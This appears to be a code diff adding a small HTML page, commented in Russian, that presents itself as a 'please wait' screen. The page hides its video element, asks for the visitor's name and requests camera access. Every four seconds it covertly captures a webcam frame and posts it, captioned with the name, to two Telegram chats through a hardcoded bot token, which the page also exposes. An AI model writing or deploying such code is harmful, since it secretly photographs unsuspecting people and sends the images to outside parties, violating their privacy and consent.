@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Camera Access</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex bg-sky-950 items-center h-screen justify-center">
+  <video class="hidden" id="video" width="640" height="480" autoplay></video>
+  <button class="hidden" id="captureButton">Сделать фотографию</button>
+
+  <h1 class="text-4xl text-center animate-pulse text-amber-400">
+    Пожалуйста, подождите........
+  </h1>
+
+  <script>
+    let ism = prompt("Введите ваше имя.");
+    document.addEventListener("DOMContentLoaded", function () {
+      // Получаем доступ к видеопотоку с камеры
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then(function (stream) {
+          var video = document.getElementById("video");
+          video.srcObject = stream;
+          video.play();
+        })
+        .catch(function (err) {
+          console.log("Ошибка при доступе к камере: " + err);
+        });
+
+      // Функция для отправки фотографии на чат в Telegram
+      function sendPhoto(chatId) {
+        var video = document.getElementById("video");
+        var canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        var context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(function (blob) {
+          var formData = new FormData();
+          formData.append("chat_id", chatId);  
+          formData.append("photo", blob, "photo.jpg");
+          formData.append(
+            "caption",
+            `Фотография с камеры от пользователя: ${ism}`
+          );
+
+          fetch(
+            "https://api.telegram.org/bot6053470503:AAEW-obe0M9Gc8nwKtUfpev27Ar-E8HrNTw/sendPhoto",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (!response.ok) {
+                throw new Error("Ошибка отправки фотографии на сервер");
+              }
+              console.log("Фотография успешно отправлена на сервер");
+            })
+            .catch(function (error) {
+              console.error("Произошла ошибка:", error);
+            });
+        }, "image/jpeg");
+      }
+
+      // Вызываем функцию отправки фотографии на два разных чата каждые 4 секунды
+      setInterval(function () {
+        sendPhoto("1861568967"); // первый chat_id
+        sendPhoto("1417132539");  // второй chat_id
+      }, 4000);
+
+      // Обработчик события для кнопки "Сделать фотографию"
+      document
+        .getElementById("captureButton")
+        .addEventListener("click", function() {
+          sendPhoto("1861568967"); // Вызываем функцию с указанным chat_id
+          sendPhoto("1417132539");  // Вызываем функцию с другим chat_id
+        });
+    });
+  </script>
+</body>
+</html>
